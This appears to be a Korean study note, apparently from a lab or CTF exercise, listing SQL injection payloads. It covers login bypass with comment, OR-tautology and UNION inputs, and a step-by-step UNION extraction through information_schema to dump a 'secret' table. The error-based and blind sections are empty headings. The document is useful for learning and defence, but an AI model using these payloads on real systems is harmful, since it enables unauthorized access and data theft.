# SQL Injection 공격 기법 정리

           

# 식별 & 인증 동시

(id, password 입력 시) 

가정한 query
```
select * from member where id='' and pass=''
```

## \# 
아이디에 주석처리할 수 있는 문구를 넣어 인증을 우회하는 방식.
```
id : mario'#
```
```
select * from member where id='mario'#' and pass='1234'
```

## or
or 논리 연산자를 id 입력칸에 넣어 논리 연산자의 우선순위를 이용해 공격하는 방식이다. 
```
id : mario'or'1'='1
```
```
select * from member where id='mario'or'1'='1' and pass='1234'
```

## UNION
```
id : mario' union select 1,2,3,4 #
```
```
select * from member where id='mario' union select 1,2,3,4 #' and pass='1234'
```


</br>
</br>
</br>

# 식별 & 인증 분리

(id, password 입력 시) 

가정한 query
```
select pass from member where id=''
```
가정한 password 유효성 검사 구문
```
if( db_pass == userinput_pass ){     
    로그인 성공    
}else      
```

## or
```
id : mario' or '1'='1
```
```
select pass from member where id='mario' or '1'='1'
```
→ 모든 데이터 출력
</br>
</br>
</br>

# UNION SQL Injection

(SQL 질의문 결과가 화면에 보일시. 게시판, 회원정보, 주소검색, 검색페이지 등)

```
1. 추리

select ??? from ??? where name like = '%___%'
```
```
2. 취약점 확인

verwatc%' and '1%'='1
```
```
3. order by

verwatch%' order by 1 #
verwatch%' order by 2 #
verwatch%' order by 3 #

오류가 발생할 떄까지.
```
```
4. data 출력 위치 파악

verwatc%' union select '1','2','3','4'#
```
```
5. DB 이름 확인

verwatc%' union select 1,2,database(),4 #
```
```
6. table 이름 확인

table 이름 확인하는 query문.
(
select table_name from information_schema.tables where table_schema = 'db이름'
)

verwatc%' union select '1',table_name,'3','4' from information_schema.tables where table_schema = 'segfault_sql' #
```
```
7. column 이름 확인

column 이름 확인하는 query문
(
select column_name from informarion_schema.columns where table_name='table이름'
)

verwatc%' union select '1',column_name,'3','4' from information_schema.columns where table_name='secret' #
```
```
8. data 추출

verwatc%' union select '1',secret,'3','4' from secret #
```
</br>
</br>
</br>

# Error Based SQL Injection





</br>
</br>
</br>

# Blind SQLi   
